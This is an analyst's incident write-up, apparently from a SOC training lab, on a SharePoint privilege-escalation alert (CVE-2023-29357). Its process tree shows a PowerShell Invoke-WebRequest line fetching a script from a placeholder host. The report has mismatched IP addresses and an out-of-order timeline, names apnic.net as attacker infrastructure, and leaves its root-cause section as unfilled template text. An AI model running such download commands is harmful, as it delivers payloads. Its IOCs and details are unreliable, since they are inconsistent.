---
layout: page
title: "SOC227 — Microsoft SharePoint Server Elevation of Privilege"
description: "Analyst Write-Up · CVE-2023-29357 Investigation"
image: /assets/images/projects/sharepoint-cve.png
tags: [sharepoint, cve-2023-29357, privilege-escalation]
weight: 10
---

<!-- === Brand Banner === -->
<div style="display:flex;align-items:center;gap:18px;padding:20px;border-radius:18px;background:linear-gradient(135deg,#0b1220,#121a2a 55%,#1e2a44);border:1px solid rgba(255,255,255,.06);margin-bottom:24px;color:#e8eefc;">
  <img src="/assets/images/brand/brandmark.png" alt="Brandon Love brand" style="width:60px;height:60px;border-radius:12px;object-fit:cover;" onerror="this.style.display='none'">
  <div>
    <div style="font-weight:700;font-size:22px;letter-spacing:.2px;">SOC227 — Microsoft SharePoint EoP</div>
    <div style="opacity:.85;font-size:14px;">CVE-2023-29357 · DFIR / Incident Response Report</div>
  </div>
</div>

---

## 1️) Executive Summary
On **Oct 6, 2023**, a suspicious Microsoft SharePoint Server Elevation of Privilege (**CVE-2023-29357**) was detected on host `MS-SharePointServer`.  
Investigation confirmed the activity was **malicious**; containment actions prevented further impact.  
No lateral movement was observed.

---

## 2️) Incident Details

| Field | Description |
|-------|-------------|
| **Incident ID** | 189 |
| **Analyst** | Brandon Love |
| **Date/Time Detected** | Oct 6, 2023 – 08:05 PM CST |
| **Severity** | Critical |
| **Category** | Privilege Escalation |
| **Detection Source** | EDR |
| **Business Impact** | None |
| **Systems Affected** | MS-SharePoint Server |
| **Users Involved** | None |

---

## 3️) Timeline of Events (CST)
| Time | Event |
|------|-------|
| 20:05 | Detection triggered |
| 09:00 | Analyst investigation started |
| 09:20 | Root cause identified |
| 09:30 | Containment performed |
| 09:45 | Incident resolved |

---

## 4️) Technical Analysis

**Process Tree**
```plaintext
explorer.exe → powershell.exe → Invoke-WebRequest http://example[.]com/file.ps1

```
**File Hashes:**  
- SHA256: `none`  
- MD5 (optional): `none`

**Network Indicators:**  
- Outbound connection to `<39.91.166.22:443>`  
- Domain: `<apnic.net>`

**Host Artifacts:**  
- Persistence: `<none>`  
- Notable events: not enough information given
- Screenshots / excerpts linked in Appendices

**MITRE ATT&CK:**  
- T1190 – Exploit Pubic-Facing Application  
- T1068 – Exploitation for Privilege Escalation  

---

## 5) Containment & Eradication (Checked = Completed)
- [X] Isolated affected host  
- [X] Elevated to Tier 2
- [ ] Quarantined payload / deleted artifacts  
- [ ] Revoked creds / invalidated tokens  
- [ ] Blocked IPs/domains/signatures across controls  
- [ ] Removed persistence mechanisms  
- [ ] Closed attacker sessions

---

## 6) Recovery & Verification
- [ ] Restored network access after validation  
- [ ] Full AV/EDR scan clean  
- [ ] Patched vulnerable components  
- [ ] Monitored for reoccurrence for **X** hours/days

---

## 7) Root Cause
> _Explain the initiating action / vector. Add supporting evidence._  
> Example: User executed a phishing attachment (`invoice.docm`) that downloaded and executed a PowerShell stager.

---

## 8) Recommendations
- Update and Patch Server according to Vendors Specifications  
- Delete any new users that were added if any
- SIEM/EDR tuning for suspicious command-line patterns  
- URL/IP filtering for high-risk categories  
- MFA/Conditional Access review (where relevant)

---

## 9) Indicators of Compromise (IOCs)
| Type | Value | Description |
|------|------|-------------|
| IP | 39.91.166.222 | Suspected C2 |
| File Hash | `none` | Malicious payload |
| URL | `http://www.apnic.net` | Download location |
| Domain | `apnic.net` | Attacker infra |

---

## 10) Appendices (Evidence)
- Screenshots of alert console  
- Sysmon/Windows Event excerpts  
- PowerShell transcripts  
- VirusTotal / sandbox results  
- Packet captures (if applicable)

---

<small style="opacity:.7">© 2025 Brandon Love. Last updated: "2025-11-13 13:18".</small>

<!-- Minimal in-page styles to match the site's aesthetic -->
<style>
  table { border-collapse: collapse; width: 100%; }
  th, td { border: 1px solid #e3e8f5; padding: 8px 10px; }
  thead th { background: #0b1220; color: #e8eefc; }
  code { background:#0f172a; color:#e2e8f0; padding:2px 6px; border-radius:6px; }
  pre code { display:block; padding:12px 14px; }
  h1, h2, h3 { scroll-margin-top: 84px; }
  hr { border:0; border-top:1px solid #e3e8f5; margin: 24px 0; }
  .btn { display:inline-block;padding:10px 14px;border-radius:10px;border:1px solid #dbe4ff;text-decoration:none; }
</style>
